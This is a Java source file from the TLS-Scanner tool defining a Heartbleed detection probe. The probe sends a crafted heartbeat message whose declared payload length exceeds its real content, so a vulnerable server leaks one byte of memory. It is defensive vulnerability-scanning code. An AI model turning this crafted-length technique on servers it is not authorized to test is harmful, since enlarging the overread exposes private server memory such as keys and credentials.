/*
 * TLS-Scanner - A TLS configuration and analysis tool based on TLS-Attacker
 *
 * Copyright 2017-2023 Ruhr University Bochum, Paderborn University, Technology Innovation Institute, and Hackmanit GmbH
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */
package de.rub.nds.tlsscanner.serverscanner.probe;

import de.rub.nds.modifiablevariable.util.Modifiable;
import de.rub.nds.scanner.core.probe.requirements.ProbeRequirement;
import de.rub.nds.scanner.core.probe.requirements.Requirement;
import de.rub.nds.scanner.core.probe.result.TestResult;
import de.rub.nds.scanner.core.probe.result.TestResults;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.ExtensionType;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.constants.ProtocolMessageType;
import de.rub.nds.tlsattacker.core.constants.RunningModeType;
import de.rub.nds.tlsattacker.core.protocol.message.HeartbeatMessage;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.workflow.ParallelExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceResultUtil;
import de.rub.nds.tlsattacker.core.workflow.action.ReceiveAction;
import de.rub.nds.tlsattacker.core.workflow.action.SendAction;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
import de.rub.nds.tlsscanner.core.constants.TlsAnalyzedProperty;
import de.rub.nds.tlsscanner.core.constants.TlsProbeType;
import de.rub.nds.tlsscanner.core.probe.requirements.ExtensionRequirement;
import de.rub.nds.tlsscanner.serverscanner.report.ServerReport;
import de.rub.nds.tlsscanner.serverscanner.selector.ConfigSelector;

public class HeartbleedProbe extends TlsServerProbe {

    private TestResult vulnerable = TestResults.COULD_NOT_TEST;

    public HeartbleedProbe(ConfigSelector configSelector, ParallelExecutor parallelExecutor) {
        super(parallelExecutor, TlsProbeType.HEARTBLEED, configSelector);
        register(TlsAnalyzedProperty.VULNERABLE_TO_HEARTBLEED);
    }

    @Override
    protected void executeTest() {
        Config tlsConfig = configSelector.getAnyWorkingBaseConfig();
        tlsConfig.setAddHeartbeatExtension(true);

        State state = new State(tlsConfig, getTrace(tlsConfig));
        executeState(state);
        if (WorkflowTraceResultUtil.didReceiveMessage(
                state.getWorkflowTrace(), ProtocolMessageType.HEARTBEAT)) {
            vulnerable = TestResults.TRUE;
        } else if (!WorkflowTraceResultUtil.didReceiveMessage(
                state.getWorkflowTrace(), HandshakeMessageType.FINISHED)) {
            vulnerable = TestResults.UNCERTAIN;
        } else {
            vulnerable = TestResults.FALSE;
        }
    }

    private WorkflowTrace getTrace(Config tlsConfig) {
        WorkflowTrace trace =
                new WorkflowConfigurationFactory(tlsConfig)
                        .createWorkflowTrace(
                                WorkflowTraceType.DYNAMIC_HANDSHAKE, RunningModeType.CLIENT);
        HeartbeatMessage heartbeatMessage = new HeartbeatMessage();
        // The payload consists of arbitrary content. We just set it to 5 "A" bytes.
        heartbeatMessage.setPayload(Modifiable.explicit(new byte[] {65, 65, 65, 65, 65}));
        // The sender of a HeartbeatMessage MUST use a random padding of at least 16 bytes.
        // The padding of a received HeartbeatMessage message MUST be ignored. We set the padding
        // to 16 "P" bytes.
        heartbeatMessage.setPadding(
                Modifiable.explicit(
                        new byte[] {
                            80, 80, 80, 80, 80, 80, 80, 80, 80, 80, 80, 80, 80, 80, 80, 80
                        }));
        // The length of the payload we want to override. We have 5 bytes of content and 16 bytes of
        // padding. To not be
        // very offensive, we set it to 22 which forces the server to leak one byte.
        heartbeatMessage.setPayloadLength(Modifiable.explicit(22));
        trace.addTlsAction(new SendAction(heartbeatMessage));
        trace.addTlsAction(new ReceiveAction(new HeartbeatMessage()));
        return trace;
    }

    @Override
    public void adjustConfig(ServerReport report) {}

    @Override
    public Requirement<ServerReport> getRequirements() {
        return new ProbeRequirement<ServerReport>(TlsProbeType.EXTENSIONS)
                .and(new ExtensionRequirement<>(ExtensionType.HEARTBEAT));
    }

    @Override
    protected void mergeData(ServerReport report) {
        put(TlsAnalyzedProperty.VULNERABLE_TO_HEARTBLEED, vulnerable);
    }
}
